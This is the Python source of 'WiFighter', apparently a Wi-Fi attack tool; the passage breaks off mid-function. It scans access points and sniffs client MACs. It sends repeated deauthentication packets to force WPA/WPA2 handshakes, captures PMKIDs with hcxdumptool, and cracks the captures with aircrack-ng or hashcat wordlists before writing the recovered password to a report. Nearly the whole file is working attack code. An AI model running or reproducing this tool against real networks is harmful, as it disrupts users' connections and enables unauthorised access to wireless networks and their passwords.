#!/home/filip/Coding/WiFighter/venv/bin/python3

# | IMPORT | #

import os, sys, subprocess, time, re, multiprocessing, psutil
from multiprocessing import Process, Manager
from prettytable import PrettyTable 
from scapy.all import *
from scapy.all import Dot11


# | GRAPHICS | #

ORANGE = '\033[38;5;214m' # Main color
YELLOW = '\033[33m' # System action
RED = '\033[31m' # Error
GREEN = '\033[32m' # Correct
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
RESET = '\033[0m' # Reset color

LOGO = r"""
 __      __._____________.__       .__     __                
/  \    /  \__\_   _____/|__| ____ |  |___/  |_  ___________ 
\   \/\/   /  ||    __)  |  |/ ___\|  |  \   __\/ __ \_  __ )
 \        /|  ||     \   |  / /_/  >   Y  \  | \  ___/|  | \/
  \__/\  / |__|\___  /   |__\___  /|___|  /__|  \___  >__|   
       \/          \/      /_____/      \/          \/                                                                           
"""


 #------------------------------------------------------------------------------------

# | GLOBAL VARIABLES | #

interfering_services = ['NetworkManager', 'wpa_supplicant', 'avahi-daemon']
attack_list = ['Handshake Crack', 'PMKID Attack', 'Jamming', 'Evil Twin']
deauth_modes = ['Client deauth', 'Broadcast', 'Silent']
jammer_modes = ['Client jamming', 'Broadcast jamming']

wifi_networks = []
interface = None
target_ap = None
attack = None
attack_mode = None
sniffed_clients = []
delete_capture = False
output_dir = None
output_file= None

# Get the full path of wifighter dir
wifighter_path = os.path.dirname(os.path.realpath(__file__))

 #------------------------------------------------------------------------------------

 # | INTRODUCTION | #

def introduction():
     os.system('clear')
     # Show logo
     print(f"{BLUE}{LOGO}{RESET}")
     print()
     print(f"{BLUE}Welcome :D This is WiFighter!{RESET}")
     print(f"{BLUE}Easy-to-use WiFi pen-testing security tool{RESET}")
     print(" ")
     print(f"{MAGENTA}Developed by Filip Struhar | https://github.com/FilipStruhar{RESET}")

     print()
     print()

def logo():
     os.system('clear')
     # Show logo
     print(f"{BLUE}{LOGO}{RESET}")
     print()
     print()

#---------------------------------

 # | Global Functions | #

def create_cap_dir(target, output_dir):
     if target:
          if not os.path.exists(output_dir):
               print(f"{CYAN}[>]{RESET} Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
               os.system(f'mkdir -p {output_dir}')

def create_dir(path):
     if not os.path.exists(path):
          os.system(f'mkdir -p {path}')

# Determine handshake capture file
def list_files(directory): 
     return set(os.listdir(directory))
def cap_file(files_before, files_after, keyword, filetype):
     new_files = files_after - files_before

     for filename in new_files:
          if keyword in filename and filetype in filename:
               return filename

def generate_report(attack, target_ap, crack, target, output_dir):
     current_time = datetime.now()
     timestamp = current_time.strftime("%Y-%m-%d %H:%M:%S")
     filename = attack.lower().replace(" ", "_") + f'_{str(timestamp).replace(" ", "_")}'

     print(f"{YELLOW}[>]{RESET} Generating report -> WiFighter/attacks/{target.replace(' ', '_')}/reports/{filename}.report")

     template = f"""
| {target} - {timestamp} |

* {attack} *

SSID: {target_ap['SSID']}
BSSID: {target_ap['BSSID']}
Channel: {target_ap['Channel']}
Band: {target_ap['Band']}
----
Encryption: {target_ap['Encryption']}
Authetication: {target_ap['Auth']}
Cipher: {target_ap['Cipher']}

Cracked wifi password: {crack}
     """

     create_dir(f'{output_dir}/reports')
     with open(f'{output_dir}/reports/{filename}.report', 'w') as report:
          report.write(template)

def loading_animation(message): 
     spinner = ['|', '/', '-', '\\']
     idx = 0
     try:
          while True:
               sys.stdout.write(f"\r{CYAN}{spinner[idx % len(spinner)]}{RESET} {message}")
               sys.stdout.flush()
               idx += 1
               time.sleep(0.1)
     except:
          pass


#---------------------------------

 # | INTERRFAC MANAGMENT | #

def start_services(verbose):
     global interfering_services
     for service in interfering_services:
          status = os.popen(f'systemctl is-active {service}').read().strip()

          if status == 'inactive':
               if verbose:
                    print(f"{CYAN}Starting {service} service...{RESET}")
               os.system(f'systemctl start {service}')
          else:
               if verbose:
                    print(f"{CYAN}{service} service is already running.{RESET}")

def stop_services(verbose):
     global interfering_services
     for service in interfering_services:
          status = os.popen(f'systemctl is-active {service}').read().strip()

          if status == 'active':
               if verbose:
                    print(f"{CYAN}Stopping {service} service...{RESET}")
               os.system(f'systemctl stop {service}')
          else:
               if verbose:
                    print(f"{CYAN}{service} service is not running.{RESET}")


def interface_mode(interface):
     mode = None
     interface_info = os.popen(f'iw dev {interface} info 2>&1').read()
     if 'type managed' in interface_info:
          mode = 'Managed'
     elif 'type monitor' in interface_info:
          mode = 'Monitor'

     return mode


def monitor_switch(verbose, command, interface, channel):
     mode = interface_mode(interface)

     if mode:
          # Start Monitor mode
          if command == "start" and mode == "Managed":
               # Kill interfering services
               stop_services(verbose)

               # Switch interface to Monitorw
               os.system(f'ip link set {interface} down 2>&1')
               if verbose:
                    print(f"{CYAN}Setting {interface} to monitor mode...{RESET}")
               os.system(f'iw dev {interface} set type monitor 2>&1')
               os.system(f'ip link set {interface} up 2>&1')
               if channel: 
                    if verbose:
                         print(f"{CYAN}Setting {interface} to listen on channel {channel}...{RESET}")
                    result = subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)], capture_output=True, text=True)
                    if result.returncode != 0:  # Check if set channel returned error
                         print(f'{RED}Setting network card to channel "{channel}" returned error -> check prompted channel number!{RESET}')

          elif command == "start":
               if verbose:
                    print(f'{CYAN}Interface {interface} is already in Monitor Mode, skipping...{RESET}')
          
          # Stop Monitor mode
          if command == "stop" and mode == "Monitor":
               # Switch interface to Managed
               os.system(f'ip link set {interface} down 2>&1')
               if verbose:
                    print(f"{CYAN}Setting {interface} to managed mode...{RESET}")
               os.system(f'iw dev {interface} set type managed 2>&1')
               os.system(f'ip link set {interface} up 2>&1')

               # Start needed services
               start_services(verbose)

          elif command == "stop":
               if verbose:
                    print(f'{CYAN}Interface {interface} is already in Managed Mode, skipping...{RESET}')              
     elif verbose:
          print(f'{RED}Interface "{interface}" does not exist! Retype "wifighter [start/stop/status] [-INTERFACE_NAME-]"{RESET}')


def list_interfaces():
     detected_interfaces = []

     # Get wireless interfaces array
     try:
        # Run 'iw dev' to get wireless interface details
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=True)

        # Find all interface names using regex
        detected_interfaces = re.findall(r'Interface\s+(\S+)', result.stdout)
     except subprocess.CalledProcessError as e:
          print(f"{RED}Error executing 'iw dev': {e}{RESET}")

     if detected_interfaces:
          for interface in detected_interfaces:
               print(f"{CYAN}{interface}{RESET}")
#---------------------------------

 # | CHOOSING | #

def choose_interface():
     detected_interfaces = []

     # Get wireless interfaces array
     try:
        # Run 'iw dev' to get wireless interface details
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=True)

        # Find all interface names using regex
        detected_interfaces = re.findall(r'Interface\s+(\S+)', result.stdout)
     except subprocess.CalledProcessError as e:
          print(f"{RED}Error executing 'iw dev': {e}{RESET}")
     

     if detected_interfaces:
          idx = 1
          # Show detected interfaces
          print(f"{CYAN}| Select Interface |{RESET}\n")

          for interface in detected_interfaces:
               print(f"{idx}. {interface}")
               idx += 1

          try:
               while True:     
                    try:
                         # Prompt the user to choose an interface by number
                         choice = int(input(f"\nInterface number: ")) - 1
                    except ValueError:
                         print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                         continue
                    
                    # Check if the choice is in range
                    if 0 <= choice < len(detected_interfaces):
                         # Return chosen interface
                         interface = detected_interfaces[choice]
                         return interface
                    else:
                         print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
          except KeyboardInterrupt:
               pass

def choose_target():
     global wifi_networks
     try:
          while True:     
               try:
                    # Prompt the user to choose an interface by number
                    choice = int(input(f"\n\nTarget number: ")) - 1
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue
               # Check if the choice is in range
               if 0 <= choice < len(wifi_networks):
                    target_ap = wifi_networks[choice]
                    return target_ap # Return chosen interface
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          pass

def choose_attack(target_ap):
     global attack_list

     print(f'{CYAN}| Select Attack |{RESET}\n')
     target_ap = f"{target_ap['SSID']} ({target_ap['BSSID']})" if target_ap['SSID'] else target_ap['BSSID']
     print(f'Select attack on {target_ap}')

     idx = 1
     # Show attack modes
     for attack in attack_list:
          print(f"{idx}. {attack}")
          idx += 1
     try:
          while True:     
               try:
                    # Prompt the user to choose an attack by number
                    choice = int(input(f"\nAttack number: ")) - 1
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue

               # Check if the choice is in range
               if 0 <= choice < len(attack_list):
                    attack = attack_list[choice]
                    return attack # Return chosen attack
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          pass

def choose_deauth_mode():
     global deauth_modes
     
     print(f'{CYAN}| Select Deauth Mode |{RESET}\n')

     idx = 1
     # Show attack modes
     for deauth_mode in deauth_modes:
          print(f"{idx}. {deauth_mode}")
          idx += 1
     try:
          while True:     
               try:
                    # Prompt the user to choose an deauth mode by number
                    choice = int(input(f"\nMode number: ")) - 1
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue

               # Check if the choice is in range
               if 0 <= choice < len(deauth_modes):
                    deauth_mode = deauth_modes[choice]
                    return deauth_mode # Return chosen deauth mode
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          pass

def choose_jammer_mode():
     global jammer_modes
     
     print(f'{CYAN}| Select Jammer Mode |{RESET}\n')

     idx = 1
     # Show attack modes
     for jammer_mode in jammer_modes:
          print(f"{idx}. {jammer_mode}")
          idx += 1
     try:
          while True:     
               try:
                    # Prompt the user to choose an deauth mode by number
                    choice = int(input(f"\nMode number: ")) - 1
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue

               # Check if the choice is in range
               if 0 <= choice < len(jammer_modes):
                    jammer_mode = jammer_modes[choice]
                    return jammer_mode # Return chosen deauth mode
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          pass

def choose_twin_mode():
     global twin_modes
     
     print(f'{CYAN}| Select Evil Twin Mode |{RESET}\n')

     idx = 1
     # Show attack modes
     for twin_mode in twin_modes:
          print(f"{idx}. {twin_mode}")
          idx += 1
     try:
          while True:     
               try:
                    # Prompt the user to choose an deauth mode by number
                    choice = int(input(f"\nMode number: ")) - 1
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue

               # Check if the choice is in range
               if 0 <= choice < len(twin_modes):
                    twin_mode = twin_modes[choice]
                    return twin_mode # Return chosen deauth mode
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          pass

def choose_wordlist():
     global wifighter_path
     wordlists_path = f'{wifighter_path}/wordlists/'
     detected_wordlists = []

     # Create wordlists directory doesn't exist
     create_dir(wordlists_path)

     # Iterate over all the interfaces in the directory
     for wordlist in os.listdir(wordlists_path):
          detected_wordlists.append(wordlist)

     if detected_wordlists:
          idx = 1
          # Show detected interfaces
          print(f"\n{CYAN}Select wordlist for cracking:{RESET}\n")

          for wordlist in detected_wordlists:
               print(f"{idx}. {wordlist}")
               idx += 1

          try:
               while True:     
                    try:
                         # Prompt the user to choose an interface by number
                         choice = int(input(f"\nWordlist number (if you wish to skip press [ctrl + c]): ")) - 1
                    except ValueError:
                         print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                         continue
                    
                    # Check if the choice is in range
                    if 0 <= choice < len(detected_wordlists):
                         # Return chosen interface
                         wordlist = detected_wordlists[choice]
                         return wordlist
                    else:
                         print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
          except KeyboardInterrupt:
               pass     
     else:
          print(f"\n{YELLOW}No wordlists found! Skipping password cracking... Add wordlists -> WiFighter/wordlists/{RESET}")


 #------------------------------------------------------------------------------------

# | AP Scan | #

def scan_ap(interface):
     wifi_networks = []

     def scan_wifi(interface, conn):
          while True:
               try:
                    # Run the iw scan command with stderr redirected to stdout
                    command = f'iw dev {interface} scan 2>&1'
                    scan_result = os.popen(command).read()
                    if 'Device or resource busy' in scan_result or 'Operation not supported' in scan_result or 'Network is down' in scan_result or 'command failed' in scan_result:
                         # Continue scanning if an error occurs
                         continue
                    conn.send(scan_result)
                    conn.close()
                    break
               except KeyboardInterrupt:
                    conn.close()
                    break
     def loading_animation(conn):
          spinner = ['|', '/', '-', '\\']
          idx = 0
          try:
               # Show the loading animation while scan not completed
               while True:
                    if conn.poll():
                         break
                    sys.stdout.write(f"\r{CYAN}{spinner[idx % len(spinner)]}{RESET} Scanning for APs on {interface}")
                    sys.stdout.flush()
                    idx += 1
                    time.sleep(0.1)
          except KeyboardInterrupt:
               conn.close()
     
     parent_conn, child_conn = multiprocessing.Pipe()
     scan_process = Process(target=scan_wifi, args=(interface, child_conn))
     animation_process = Process(target=loading_animation, args=(parent_conn,))
     
     scan_process.start()
     animation_process.start()
     scan_process.join()
     animation_process.join()
     
     # Get iw scan result
     scan = parent_conn.recv()
               
     # Divide the output into separate AP sections (split by specific BSS occurrence)
     ap_array = re.split(r"(?=BSS [0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})", scan)
     
     # Skip first - not AP
     ap_array = ap_array[1:]

     # Define patterns for extracting AP data
     ssid_pattern = r'SSID:\s*(.+)'
     bssid_pattern = r"([0-9A-Fa-f:]{17})"           
     signal_pattern = r"signal: (-?\d+\.\d+) dBm"
     channel_pattern = r"primary channel: (\d+)"
     frequency_pattern = r"freq: (\d+\.\d+)" 
     auth_pattern = r'\* Authentication suites: (.+?)\n'
     cipher_pattern = r'\* Pairwise ciphers: (.+?)\n'

     for ap in ap_array:

          ssid_match = re.search(ssid_pattern, ap)
          bssid_match = re.search(bssid_pattern, ap)
          signal_match = re.search(signal_pattern, ap)
          channel_match = re.search(channel_pattern, ap)
          frequency_match = re.search(frequency_pattern, ap)
          auth_match = re.search(auth_pattern, ap)
          cipher_match = re.search(cipher_pattern, ap)
          
          # Extract AP properties or set to None if not found
          ssid = ssid_match.group(1).strip() if ssid_match else None
          bssid = bssid_match.group(1).strip() if bssid_match else None
          signal = f'{round(float(signal_match.group(1).strip()))}' if signal_match else None
          channel = channel_match.group(1).strip() if channel_match else None
          frequency = round(float(frequency_match.group(1).strip())) if frequency_match else None
          auth = auth_match.group(1).strip() if auth_match else None
          cipher = cipher_match.group(1).strip() if cipher_match else None
          
          # Map frequency to band (e.g., 2.4 GHz or 5 GHz)
          band = None
          if frequency:
               if frequency < 3000:
                    band = "2.4 GHz"
               elif frequency >= 5000:
                    band = "5 GHz"

          # Determine security type
          encryption = None
          if auth and cipher:
               if 'SAE' in auth:
                    encryption = 'WPA3'
               elif (auth == 'PSK' or auth == 'IEEE 802.1X') and 'CCMP' in cipher:
                    encryption = 'WPA2'
               elif (auth == 'PSK' or auth == 'IEEE 802.1X') and 'TKIP' in cipher:
                    encryption = 'WPA'
               elif 'PSK' not in auth:
                    encryption = 'WEP' 
          else:
               encryption = "Open/Unknown"
          
          if int(signal) > -100:
               # Append parsed AP information to array
               wifi_networks.append({
                    'SSID': ssid,
                    'BSSID': bssid,
                    'Channel': channel,
                    'Signal': signal,
                    'Band': band,
                    'Encryption': encryption,
                    'Auth': auth,
                    'Cipher': cipher
               })
                    
     # Sort array by signal strength (strongest first)
     wifi_networks = sorted(wifi_networks, key=lambda x: x['Signal'], reverse=False)

     return wifi_networks

def list_ap(wifi_networks):
     # Create AP table
     table = PrettyTable()
     table.field_names = ["ID", "SSID", "BSSID", "Channel", "Signal (dBm)", "Band", "Encryption", "Auth", "Cipher"]
     for idx, ap in enumerate(wifi_networks, start=1):
          table.add_row([
               f"{idx}",
               ap['SSID'] or "N/A",
               ap['BSSID'] or "N/A",
               ap['Channel'] or "N/A",
               f"{ap['Signal']} dBm" if ap['Signal'] else "N/A",
               ap['Band'] or "N/A",
               ap['Encryption'] or "N/A",
               ap['Auth'] or "N/A",
               ap['Cipher'] or "N/A"
          ])

     print(f"{CYAN}| AP Scan |{RESET}")
     print(f"{MAGENTA}{table}{RESET}")
     print("\nPress [Ctrl + C] to stop")


 #-----------------------------------------------------------------------------------

# | AP Client Scan | #

def sniff_clients(interface, target_ap, target):
     standardized_MACs = ['ff:ff:ff:ff:ff:ff', '01:80:c2:00:00:00', '01:80:c2:00:00:0e', '01:00:5e', '33:33']
     interrupted = multiprocessing.Value('b', False)

     # Set shared list so multiprocess processes can append into it
     manager = Manager()
     clients = manager.list()
     def packet_handler(pkt):
          if pkt.haslayer(Dot11):
               # Check if the packet is a data frame
               if pkt.type == 2: 
                    if pkt.addr2 == target_ap and pkt.addr1 not in clients: 
                         # Check if not one of the standardized MAC addresses
                         if not any(pkt.addr1.startswith(mac) for mac in standardized_MACs): 
                              #print(f'2 {pkt.addr2} = {target_ap}, | {pkt.addr1} |')
                              clients.append(pkt.addr1)

                    elif pkt.addr1 == target_ap and pkt.addr2 not in clients:
                         # Check if not one of the standardized MAC addresses
                         if not any(pkt.addr2.startswith(mac) for mac in standardized_MACs):
                              #print(f'1 {pkt.addr1} = {target_ap}, | {pkt.addr2} |')
                              clients.append(pkt.addr2)

     def sniffing_process(interrupted):
          try:
               sniff(iface=interface, prn=packet_handler, timeout=8)
          except KeyboardInterrupt:
               interrupted.value = True

     # Define processews
     process = multiprocessing.Process(target=sniffing_process, args=(interrupted,))
     loading_message = f"Scanning for {target}'s clients"
     loading = multiprocessing.Process(target=loading_animation, args=(str(loading_message),))
     process.start() 
     loading.start() # Start of loading animation

     try:
          while process.is_alive():
               time.sleep(1)
     except KeyboardInterrupt:
          interrupted.value = True
          process.terminate()
          process.join()

     loading.terminate() # End loading animation
     loading.join()

     return list(clients), interrupted.value
def list_clients(sniffed_clients, ssid, bssid):
     # Create AP table
     table = PrettyTable()
     table.field_names = ["ID", "Client MAC"]
     for idx, client_mac in enumerate(sniffed_clients):
          table.add_row([
               f"{idx}",
               client_mac or "N/A"
          ])
     if ssid:
          print(f"{CYAN}| {ssid}'s ({bssid}) Clients |{RESET}")
     else:
          print(f"{CYAN}| {bssid} Clients |{RESET}")
     print(f"{MAGENTA}{table}{RESET}")
     print("\nPress [Ctrl + C] to stop")
def choose_target_client(sniffed_clients):
     try:
          while True:     
               try:
                    # Prompt the user to choose an interface by number
                    choice = int(input(f"\n\nTarget client number: "))
               except ValueError:
                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
                    continue
               # Check if the choice is in range
               if 0 <= choice < len(sniffed_clients):
                    target_client = sniffed_clients[choice]
                    return target_client # Return chosen interface
               else:
                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
     except KeyboardInterrupt:
          pass

#-----------------------------------------------------------------------------------

# | Handshake Crack | #

def handshake_crack(target_ap, interface, deauth_mode, target):
     global sniffed_clients, wifighter_path, output_dir, output_file, delete_capture

     # Prepare variables
     ssid = target_ap['SSID'] if target_ap['SSID'] else None
     bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
     channel = target_ap['Channel'] if target_ap['Channel'] else None
     deauth_mode = deauth_mode.lower()
     target_client = None
     wordlist = None
     password = None

     # Define output dir for handshakes
     output_dir = f"{wifighter_path}/attacks/{target.replace(' ', '_')}"

     # Set deauth client if attack mode "Client deauth"
     if deauth_mode == 'client deauth':
          logo()
          while True:
               sniff_result, interrupted = sniff_clients(interface, bssid, target) # Get available AP's
               if not interrupted:
                    sniffed_clients = sniff_result # Set sniffed clients list only when the sniff wasn't ended earlier with ctrl + c (only on natural end of each sniff scanning)
               logo()
               list_clients(sniffed_clients, ssid, bssid) # Show the sniff results periodically in table
               if interrupted: # Break the while cycle when Keyboardinterrupt is caught in the sniff function
                    break

          # Let user choose client as target
          if sniffed_clients:
               try:
                    target_client = choose_target_client(sniffed_clients)
               except:
                    pass       

     # Kill airodump processes after capturing handshake
     def kill_airodump_processes():
          for proc in psutil.process_iter(['pid', 'name']):
               try:
                    if proc.info['name'] == 'airodump-ng':
                         proc.terminate()
                         proc.wait()
               except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
          print(f"{CYAN}[>]{RESET} Killing all airodump-ng processes...")

     # Run airodump-ng
     def run_airodump(interface, bssid, channel, output_dir):
          if interface and bssid and channel and output_dir:
               try:
                    command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
                    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
               except:
                    pass

     # Run aireplay-ng
     def run_aireplay(interface, bssid, target_client, deauth_mode):
          if interface and bssid and deauth_mode:
               if deauth_mode == "client deauth":
                    if target_client:
                         try:
                              command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', target_client, interface]
                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                              print(f"{CYAN}[>]{RESET} Deauth packet send to client {target_client}{RESET}")
                         except:
                              pass
               elif deauth_mode == "broadcast":
                    try:
                         command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
                         subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         print(f"{CYAN}[>]{RESET} Deauth packet send to broadcast")
                    except:
                         pass
               else:
                    pass

     logo()
     print(f'{CYAN}| Handshake Crack |{RESET}\n')
     if ssid:
          print(f'Attacking on {ssid} ({bssid}) with {interface}...')
     else:
          print(f'Attacking on {bssid} with {interface}...')

     # Switch to silent deauth mode when target AP was not set and deauth mode was client deauth
     if deauth_mode == 'client deauth':
          if not target_client:
               print(f'{YELLOW}No target client set, switching to silent deauth mode...{RESET}')
               deauth_mode = 'silent'

     create_cap_dir(target, output_dir) # Create capture dir if not exist

     # Handle cases where handshake cracking not possible
     if target_ap['Encryption'] == 'Open/Unknown':
          print(f"\n{YELLOW}!! This is either Open network or the encryption type wasn't recognized correctly !! Skipping...{RESET}")
          return
     elif target_ap['Encryption'] == 'WPA3' or target_ap['Auth'] == 'IEEE 802.1X':
          print(f"\n{YELLOW}!! WPA3 protected or Enterprise authenticated networks aren't vulnerable to this type of attack !! Skipping...{RESET}")
          return

     # Define processes
     capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
     deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))

     files_before = list_files(output_dir) # Get files before airodump-ng adds new

     # Listen for handshake
     capture_handshake.start() # Start airodump-ng process
     delete_capture = True
     time.sleep(2)

     # Deauth client/s if selected
     if deauth_mode != 'silent':
          deauth_clients.start() # Start aireplay-ng process
          deauth_clients.join() # Wait for the process to stop

     files_after = list_files(output_dir) # Get files after airodump-ng adds new
     output_file = cap_file(files_before, files_after, 'handshake', '.cap') # Determine output_file in which airodump-ng stores

     # Wait and verify that handshake was captured successfuly
     captured = False
     print(f"{CYAN}[>]{RESET} Waiting for handshake...")
     if deauth_mode != 'silent':
          start_time = time.time() # Start deauth timer
     while not captured:
          if os.path.exists(f"{output_dir}/{output_file}"):
               try:
                    command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
                    verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    output = str(verify.communicate())
               except:
                    pass
               if "(0 handshake)" not in output and "Unknown" not in output and "No networks found, exiting." not in output:
                    print(f"{CYAN}[>]{RESET} Handshake/s captured!")
                    captured = True
                    delete_capture = False

          # Periodically deauth                    
          if deauth_mode != 'silent':
               end_time = time.time() # End deauth timer
               elapsed_time = end_time - start_time
               elapsed_time = int(elapsed_time) # Get elapsed time before last deauth
               if elapsed_time >= 25: # Set time period
                    deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
                    deauth_clients.start() # Start aireplay-ng process
                    deauth_clients.join() # Wait for the process to stop
                    start_time = time.time() # Reset deauth timer

          time.sleep(2)

     kill_airodump_processes() # Kill all airodump-ng processes

     try:
          wordlist = choose_wordlist()
     except KeyboardInterrupt:
          pass
     
     # Try cracking the password
     if wordlist:
          try:
               print(f"{CYAN}[>]{RESET} Cracking handshake with aircrack-ng (CPU) using {wordlist}")
               command = ['sudo', 'aircrack-ng', '-w', f'wordlists/{wordlist}', f'{output_dir}/{output_file}']
               crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
               output = str(crack.communicate())

               if 'KEY FOUND!' in output:
                    password_pattern = r'KEY FOUND!\s* \[\s*(.+?)\s*\]'
                    password_match = re.search(password_pattern, output) # Search for the pattern in the output string

                    # Extract and print the key if found
                    if password_match:
                         password = password_match.group(1)
                         print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
                         generate_report('Handshake Crack', target_ap, password, target, output_dir)
          except KeyboardInterrupt:
               pass
     
     if not password or not wordlist:
          print(f"\n{CYAN}[>]{RESET} Password not found...")
          print(f"{YELLOW}[>]{RESET} Handshake available for offline cracking (use aircrack-ng/hashcat) -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")



# | PMKID ATTACK | #
def pmkid_attack(target_ap, interface, target):
     global wifighter_path, output_dir, output_file, delete_capture

     # Prepare variables
     ssid = target_ap['SSID'] if target_ap['SSID'] else None
     bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
     channel = target_ap['Channel'] if target_ap['Channel'] else None
     wordlist = None
     password = None

     # Define output dir for handshakes
     output_dir = f"{wifighter_path}/attacks/{target.replace(' ', '_')}"

     # Run airodump-ng
     def run_hcxdumptool(interface, bssid, channel, output_dir):
          if interface and bssid and channel and output_dir:
               try:
                    command = ['sudo', 'hcxdumptool', '-o', f'{output_dir}/pmkid_capture.pcapng', '-i', interface, '-c', channel, '--enable_status=3', '--filtermode=2', f'--filterlist_ap={bssid}']
                    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
               except:
                    pass


     logo()
     print(f'{CYAN}| PMKID Attack |{RESET}\n')
     if ssid:
          print(f'Attacking on {ssid} ({bssid}) with {interface}...')
     else:
          print(f'Attacking on {bssid} with {interface}...')


     create_cap_dir(target, output_dir) # Create capture dir if not exist

     # Handle cases where handshake cracking not possible
     if target_ap['Encryption'] == 'Open/Unknown':
          print(f"\n{YELLOW}!! This is either Open network or the encryption type wasn't recognized correctly !! Skipping...{RESET}")
          return
     elif target_ap['Encryption'] == 'WPA3' or target_ap['Auth'] == 'IEEE 802.1X':
          print(f"\n{YELLOW}!! WPA3 protected or Enterprise authenticated networks aren't vulnerable to this type of attack !! Skipping...{RESET}")
          return

     # Define processes
     capture_pmkid = multiprocessing.Process(target = run_hcxdumptool, args=(interface, bssid, channel, output_dir))

     files_before = list_files(output_dir) # Get files before airodump-ng adds new

     # Listen for handshake
     capture_pmkid.start() # Start airodump-ng process
     delete_capture = True
     time.sleep(2)

     files_after = list_files(output_dir) # Get files after airodump-ng adds new
     output_file = cap_file(files_before, files_after, 'pmkid_capture', '.pcapng') # Determine output_file in which airodump-ng stores
     try:
          file_num = output_file.split('-')[1]
     except:
          file_num = None
     
     # Wait and verify that handshake was captured successfuly
     captured = False
     print(f"{CYAN}[>]{RESET} Waiting for PMKID...")
     while not captured:
          if os.path.exists(f"{output_dir}/{output_file}"):
               try:
                    # !! If no EAPOLs caught no pmkid_hash file will be created !!
                    if file_num:
                         command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash-{file_num}', f'{output_dir}/{output_file}']
                    else:
                         command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash', f'{output_dir}/{output_file}']
                    verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    output = str(verify.communicate())
               except:
                    pass
               # Extract the caught PMKID's number value
               pmkid_pattern = r'RSN PMKID written to 22000 hash file.....:\s+(\d+)'
               pmkid_match = re.search(pmkid_pattern, output) # Search for the pattern in the output string
               if pmkid_match:
                    pmkid = pmkid_match.group(1)
                    if int(pmkid) > 0:
                         print(f"{CYAN}[>]{RESET} PMKID captured!")
                         captured = True
                         delete_capture = False

          time.sleep(4)
          
     # Kill hcxdumptool process
     capture_pmkid.terminate()

     try:
          wordlist = choose_wordlist()
     except KeyboardInterrupt:
          pass
     
     # Try cracking the password
     if wordlist:
          try:
               print(f"{CYAN}[>]{RESET} Cracking PMKID with hashcat (CPU) using {wordlist}")
               if file_num:
                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash-{file_num}', f'wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked-{file_num}.txt']
               else:
                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash', f'wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked.txt']
               crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
               output = str(crack.communicate())

               # Extract and print the password if found
               status_pattern = r'Status\.+:\s*(\w+)'
               status_match = re.search(status_pattern, output) # Search for the pattern in the output string
               if status_match:
                    status = status_match.group(1)
                    if status == 'Cracked':
                         # Read the password from the cracked output file
                         if os.path.exists(f'{output_dir}/pmkid_cracked-{file_num}.txt') or os.path.exists(f'{output_dir}/pmkid_cracked.txt'):
                              if file_num:
                                   cracked_output = f'{output_dir}/pmkid_cracked-{file_num}.txt'
                              else:
                                   cracked_output = f'{output_dir}/pmkid_cracked.txt'
                              with open(cracked_output, "r", encoding="utf-8") as file:
                                   content = file.read()
                                   password = content.split(':')[-1].strip()
